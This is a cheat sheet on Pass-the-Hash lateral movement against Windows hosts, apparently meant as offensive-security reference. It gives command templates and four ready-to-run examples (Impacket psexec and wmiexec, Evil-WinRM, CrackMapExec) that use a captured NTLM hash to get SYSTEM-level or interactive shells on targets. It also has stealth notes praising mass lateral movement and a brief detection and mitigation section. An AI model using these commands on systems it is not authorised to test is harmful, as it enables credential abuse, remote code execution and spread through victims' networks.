# **Pass the Hash (PtH) Cheat Sheet**  
*Lateral movement using NTLM hashes instead of plaintext passwords.*  

---

#### **Description**  
- **What**: Authenticate to remote systems/services using an NTLM hash (bypassing plaintext passwords).  
- **Works For**: Systems using **NTLM authentication** (not Kerberos).  
- **MITRE ATT&CK**: [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material).  

---

### **Prerequisites**  
1. **Local Admin Rights**:  
   - User must be a member of the **target’s local Administrators group** (or Domain Admin).  
   - Applies to:  
     - Built-in local Administrator account.  
     - Domain accounts with local admin privileges.  
     - *Note*: Post-2014 security updates block PtH for non-built-in local admin accounts.  

2. **Network Access**:  
   - SMB port **445/TCP** open (firewall).  
   - **File and Printer Sharing** enabled (default on Windows).  

3. **ADMIN$ Share**:  
   - Must be available (default enabled on Windows).  

---

### **Tools & Commands**  
| **Tool**               | **Command Syntax**                                                                 |  
|-------------------------|-----------------------------------------------------------------------------------|  
| **Impacket (psexec)**   | `impacket-psexec -hashes <LM:NT> <USER>@<TARGET_IP>`                              |  
| **Impacket (wmiexec)**  | `impacket-wmiexec -hashes <LM:NT> <USER>@<TARGET_IP>`                             |  
| **Evil-WinRM**          | `evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>`                              |  
| **CrackMapExec**        | `crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -x "<COMMAND>"`            |  
| **Metasploit (PsExec)** | `use exploit/windows/smb/psexec` + set `SMBPass` (NTLM hash)                      |  
| **Mimikatz**            | `sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>`    |  

---

#### **Examples**  
**1. Impacket’s wmiexec**:  
```bash  
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73  
```  
- **Result**: Semi-interactive shell via WMI.  
**2. Impacket’s psexec**:  
```bash  
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.139.72  
```  
- **Result**: Spawns a SYSTEM-level shell via SMB.  

**3. Evil-WinRM**:  
```bash  
evil-winrm -i 192.168.139.72 -u Administrator -H "2892D26CDF84D7A70E2EB3B9F05C425E"  
```  
- **Result**: Interactive WinRM shell (requires WinRM enabled on target).  

**4. CrackMapExec**:  
```bash  
crackmapexec smb 192.168.139.72 -u Administrator -H "2892D26CDF84D7A70E2EB3B9F05C425E" -x "whoami"  
```  
- **Result**: Executes `whoami` on the target and returns output.  
---

### **Key Notes**  
1. **Limitations**:  
   - Doesn’t work for Kerberos-authenticated services.  
   - Blocked for non-built-in local admin accounts (post-2014 patches).  

2. **Stealth**:  
   - **Impacket**: Leaves traces in Windows Event Logs (e.g., `Event ID 4688`).  
   - **CrackMapExec**: Ideal for mass lateral movement and reconnaissance.  
   - **Evil-WinRM**: Requires WinRM (5985/5986) access and valid credentials.  

---

### **Detection & Mitigation**  
**Detection**:  
- **SMB**: Monitor for `Event ID 4624` (Logon Type 3) and `Event ID 5140` (Network Share Access).  
- **WinRM**: Check `Event ID 4688` (Process Creation) for `evil-winrm` or PowerShell remoting.  

**Mitigation**:  
- Disable NTLM (enforce **Kerberos**).  
- Use **LAPS** for unique local admin passwords.  
- Block unnecessary SMB/WinRM traffic.  

---

### **References**  
- [Impacket Tools](https://github.com/fortra/impacket)  
- [Evil-WinRM Guide](https://github.com/Hackplayers/evil-winrm)  
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)  
